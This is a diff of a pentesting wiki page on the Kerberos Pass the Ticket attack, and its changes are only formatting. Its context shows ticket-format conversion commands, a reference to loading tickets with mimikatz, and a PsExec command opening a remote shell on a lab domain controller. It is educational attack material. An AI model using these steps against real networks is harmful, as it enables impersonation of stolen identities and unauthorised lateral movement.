@@ -1,6 +1,6 @@
 # Pass the Ticket
 
-## Pass The Ticket \(PTT\)
+## Pass The Ticket (PTT)
 
 This kind of attack is similar to Pass the Key, but instead of using hashes to request a ticket, the ticket itself is stolen and used to authenticate as its owner.
 
@@ -11,9 +11,9 @@ This kind of attack is similar to Pass the Key, but instead of using hashes to r
 
 ### **Swaping Linux and Windows tickets between platforms**
 
-The [ticket\_converter](https://github.com/Zer1t0/ticket_converter) script. The only needed parameters are the current ticket and the output file, it automatically detects the input ticket file format and converts it. For example:
+The [ticket\_converter](https://github.com/Zer1t0/ticket\_converter) script. The only needed parameters are the current ticket and the output file, it automatically detects the input ticket file format and converts it. For example:
 
-```text
+```
 root@kali:ticket_converter# python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
 root@kali:ticket_converter# python ticket_converter.py velociraptor.kirbi velociraptor.ccache
@@ -40,4 +40,3 @@ klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
 ```
 {% endcode %}
-
